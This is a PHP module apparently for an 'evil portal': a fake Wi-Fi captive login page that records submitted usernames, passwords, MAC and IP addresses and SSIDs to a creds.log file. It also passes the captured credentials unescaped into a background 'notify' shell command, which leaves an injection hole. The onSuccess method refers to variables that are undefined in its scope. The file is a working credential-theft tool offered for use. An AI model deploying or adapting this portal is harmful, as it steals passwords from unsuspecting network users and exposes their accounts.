<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
      if (isset($_POST['username'])) {
          $email    = isset($_POST['username']) ? $_POST['username'] : 'username';
          $pwd      = isset($_POST['password']) ? $_POST['password'] : 'password';
          $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
          $mac      = isset($_POST['mac'])      ? $_POST['mac'] : 'mac';
          $ip       = isset($_POST['ip'])       ? $_POST['ip'] : 'ip';
          $ssid     = isset($_POST['ssid'])     ? $_POST['ssid'] : 'ssid';

          $reflector = new \ReflectionClass(get_class($this));
          $logPath = dirname($reflector->getFileName());
        //   file_put_contents(
        //       "{$logPath}/creds.log",
        //       "[" . date('Y-m-d H:i:s') . "Z]\n" .
        //       "ssid    : {$ssid}\n".
        //       "email   : {$email}\n".
        //       "password: {$pwd}\n".
        //       "hostname: {$hostname}\n".
        //       "mac     : {$mac}\n"."ip      : {$ip}\n".
        //       "\n",
        //       FILE_APPEND
        //     );
        file_put_contents("{$logPath}/creds.log","[" . date('Y-m-d H:i:s') . "Z]\n" . "ssid    : {$ssid}\n" . "email   : {$email}\n" . "password: {$pwd}\n" . "hostname: {$hostname}\n" . "mac     : {$mac}\n"."ip      : {$ip}\n" . "\n", FILE_APPEND);
        $this->execBackground("notify $email' - '$pwd");
      }
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
        $this->execBackground("notify $email' - '$pwd");
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}